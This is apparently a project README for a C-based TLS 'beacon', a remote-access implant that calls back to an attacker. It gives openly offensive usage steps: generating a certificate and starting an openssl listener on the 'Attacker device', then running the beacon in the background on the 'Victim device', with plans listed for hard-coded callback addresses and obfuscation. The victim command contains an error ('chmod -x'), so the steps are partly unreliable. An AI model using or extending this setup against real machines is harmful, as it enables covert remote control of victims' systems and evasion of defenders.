# Lightweight-TLS-Beacon
<h1>Grotesque omadhaun</h1>
C based beacon that makes use of TLS. Should be simple enough to throw into... most places.

<p>TODO: Show all output Formatting<br>
      Scheduling in<br>
      Option to hard code IP/Port into build process<br>
      Maybe do some obfuscation<br>
</p>
Usage: 

```gcc ./beacon.c beacon -lssl -lcrypto```

Attacker device: ```openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes```
```openssl s_server -accept 4443 -cert cert.pem -key key.pem```

Victim device: ```chmod -x ./beacon; ./beacon &```
